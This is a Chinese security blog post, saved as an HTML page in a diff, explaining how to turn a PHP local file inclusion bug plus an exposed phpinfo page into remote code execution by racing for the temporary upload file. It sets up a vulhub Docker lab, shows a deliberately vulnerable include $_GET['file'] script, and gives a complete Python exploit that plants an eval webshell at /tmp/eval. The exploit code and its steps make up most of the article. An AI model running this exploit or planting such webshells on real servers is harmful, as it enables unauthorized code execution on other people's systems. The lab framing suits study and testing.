@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          phpinfo with LFI - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/07/phpinfo-with-LFI/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#php" title="php">php</a>
+                        
+                    </div>
+                    <h1>phpinfo with LFI</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-07-18
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="phpinfo-with-LFI"><a href="#phpinfo-with-LFI" class="headerlink" title="phpinfo with LFI"></a>phpinfo with LFI</h1><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>当存在一个任意文件包含的页面，然而又找不到可以包含的文件，且有phpinfo页面时<br>可以利用phpinfo页面，找到上传的tmp文件，进行条件竞争，生成想要获得shell</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在对一个页面进行文件上传时，无论这个页面将来是否要利用这个文件，php都会将这个文件保存成一个临时文件，默认为 tmp/php[\d\w]{6}<br>关于这个文件的信息可以通过<code>$_FILES</code>变量获取，这个临时文件将在脚本执行结束时被php销毁  </p>
+<p>对一个phpinfo页面上传文件时，可以在phpinfo中找到该临时文件的文件名<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phpinfo-with-LFI/1.png" alt></p>
+<p>此时，我们可以利用条件竞争，在php文件销毁之前利用lfi页面对临时文件进行包含，产生新的稳定shell</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>首先，逻辑顺序是<br>获取phpinfo中的临时文件名 –&gt; 对临时文件进行包含 –&gt; phpinfo页面执行结束，销毁临时文件</p>
+<p>这就需要phpinfo的执行时间远大于文件包含的时间<br>而且这里要在访问phpinfo页面开始后获取文件名，并且在结束前进行包含<br>这样，就不能等待整个http请求结束，需要我们直接操控原生的socket，在获取到临时文件名之后就进行包含  </p>
+<p>这里的思路是往请求phpinfo的包中添加许多垃圾信息，使得整个phpinfo页面变得很庞大<br>php的默认缓冲区大小为4096个字节，就相当于php每次返回4096个字节给socket连接<br>这样，当我们获取到临时文件名时，就立即发送文件包含请求<br>当整个phpinfo被垃圾信息充斥时，就有足够的时间给我们进行文件包含，从而生成shell  </p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>这里是直接利用的p神vulhub的docker镜像，看了环境也很简单</p>
+<ul>
+<li>php7.2</li>
+<li>apache</li>
+</ul>
+<p>目录文件:<br>lfi.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'file'</span>];</span><br></pre></td></tr></table></figure></p>
+<p>phpinfo.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure></p>
+<p>用docker-compose可以直接跑<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">version</span>: <span class="string">'2'</span></span><br><span class="line"><span class="attribute">services</span>:</span><br><span class="line"> <span class="attribute">php</span>:</span><br><span class="line">   <span class="attribute">image</span>: <span class="attribute">php</span>:<span class="number">7.2</span>-apache</span><br><span class="line">   <span class="attribute">volumes</span>:</span><br><span class="line">    - ./<span class="attribute">www</span>:/var/www/html</span><br><span class="line">   <span class="attribute">ports</span>:</span><br><span class="line">    - <span class="string">"8080:80"</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><p>主要麻烦就是利用socket直接操纵http请求，要控制好报文内容，不然很容易请求失败<br>其次我这是用python3写的，涉及到一些编解码的问题，注意一下就好  </p>
+<p>一开始是要先获取临时文件的偏移值<br>然后利用偏移值获取来获取临时文件名时要recv多少字节的数据<br>能接受到临时文件名时，就开始发送文件包含请求，在临时文件销毁前包含到即可生成shell</p>
+<p>p神的脚本中用了多线程，一开始以为，是要多个线程同时进入才能进行条件竞争<br>后来分析之后发现，对一个确定的临时文件，只有随后的那个包含请求能包含那个文件，从而导致了一种逻辑上的制约，就不存在线程之间的竞争<br>开多进程也可能是为了增大并发数吧。我这里为了从简就用简单的for循环来替代<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tag = <span class="string">'kingkk'</span></span><br><span class="line">PAYLOAD=<span class="string">"""&#123;&#125;\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/eval', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span>.format(tag)</span><br><span class="line"></span><br><span class="line">UPLOAD=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span>.format(PAYLOAD)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">INFOREQ=<span class="string">"""POST /phpinfo.php?a=&#123;padding&#125; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &#123;padding&#125;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;len&#125;\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#123;upload&#125;"""</span>.format(padding=padding, len=len(UPLOAD), upload=UPLOAD)</span><br><span class="line"></span><br><span class="line">LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PHPINFO_LFI</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port)</span>:</span></span><br><span class="line">		self.host = host</span><br><span class="line">		self.port = int(port)</span><br><span class="line">		self.req_payload= (INFOREQ % self.host).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">		self.lfireq = LFIREQ</span><br><span class="line">		self.offset = self.get_offfset()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get_offfset</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="string">'''</span></span><br><span class="line"><span class="string">		获取tmp名字的offset</span></span><br><span class="line"><span class="string">		'''</span></span><br><span class="line">		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		s.connect((self.host, self.port))</span><br><span class="line"></span><br><span class="line">		s.send(self.req_payload)</span><br><span class="line">		page = <span class="string">b""</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			i = s.recv(<span class="number">4096</span>)</span><br><span class="line">			page+=i        </span><br><span class="line">			<span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> i.decode(<span class="string">'utf8'</span>).endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		s.close()</span><br><span class="line"></span><br><span class="line">		pos = page.decode(<span class="string">'utf8'</span>).find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">		print(<span class="string">'get the offset :&#123;&#125; '</span>.format(pos))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> pos == <span class="number">-1</span>:</span><br><span class="line">			<span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> pos+<span class="number">256</span> <span class="comment">#多加一些字节</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">phpinfo_lfi</span><span class="params">(self)</span>:</span> </span><br><span class="line">		<span class="string">'''</span></span><br><span class="line"><span class="string">		同时发送phpinfo请求与lfi请求</span></span><br><span class="line"><span class="string">		'''</span></span><br><span class="line">		phpinfo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		lfi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">		phpinfo.connect((self.host, self.port))</span><br><span class="line">		lfi.connect((self.host, self.port))</span><br><span class="line"></span><br><span class="line">		phpinfo.send(self.req_payload)</span><br><span class="line"></span><br><span class="line">		infopage = <span class="string">b""</span> </span><br><span class="line">		<span class="keyword">while</span> len(infopage) &lt; self.offset:</span><br><span class="line">			infopage += phpinfo.recv(self.offset)</span><br><span class="line"></span><br><span class="line">		pos = infopage.decode(<span class="string">'utf8'</span>).index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">		tmpname = infopage[pos+<span class="number">17</span>:pos+<span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">		lfireq = self.lfireq % (tmpname.decode(<span class="string">'utf8'</span>),self.host)</span><br><span class="line">		lfi.send(lfireq.encode(<span class="string">'utf8'</span>))</span><br><span class="line"></span><br><span class="line">		fipage = lfi.recv(<span class="number">4096</span>)</span><br><span class="line"></span><br><span class="line">		phpinfo.close()</span><br><span class="line">		lfi.close()</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> fipage.decode(<span class="string">'utf8'</span>).find(tag) != <span class="number">-1</span>:</span><br><span class="line">			<span class="keyword">return</span> tmpname</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) &lt; <span class="number">4</span>:</span><br><span class="line">		print(<span class="string">'usage:\n\texp.py 127.0.0.1 80 500'</span>)</span><br><span class="line">		exit()</span><br><span class="line">	host = sys.argv[<span class="number">1</span>]</span><br><span class="line">	port = sys.argv[<span class="number">2</span>]</span><br><span class="line">	attempts = sys.argv[<span class="number">3</span>]</span><br><span class="line">	print(<span class="string">'&#123;x&#125;Start expolit &#123;host&#125;:&#123;port&#125; &#123;attempts&#125; times&#123;x&#125;'</span>.format(x=<span class="string">'*'</span>*<span class="number">15</span>, host=host, port=port, attempts=attempts))</span><br><span class="line"></span><br><span class="line">	p = PHPINFO_LFI(host,port)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(int(attempts)):</span><br><span class="line">		print(<span class="string">'Trying &#123;&#125;/&#123;&#125; times…'</span>.format(i, attempts), end=<span class="string">"\r"</span>)</span><br><span class="line">		<span class="keyword">if</span> p.phpinfo_lfi() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">			print(<span class="string">'Getshell success! at /tmp/eval "&lt;?=eval($_REQUEST[1])?&gt;"'</span>)</span><br><span class="line">			exit()</span><br><span class="line">	print(<span class="string">':( Failed'</span>)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phpinfo-with-LFI/1.gif" alt></p>
+<p>可以看到目录下成功生成临时文件<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/phpinfo-with-LFI/2.png" alt></p>
+<h2 id="Reference-Link"><a href="#Reference-Link" class="headerlink" title="Reference Link"></a>Reference Link</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/07/简析XXE/" data-toggle="tooltip" data-placement="top" title="简析XXE">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/07/随笔-7-3/" data-toggle="tooltip" data-placement="top" title="随笔-7.3">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#php" title="php">php</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
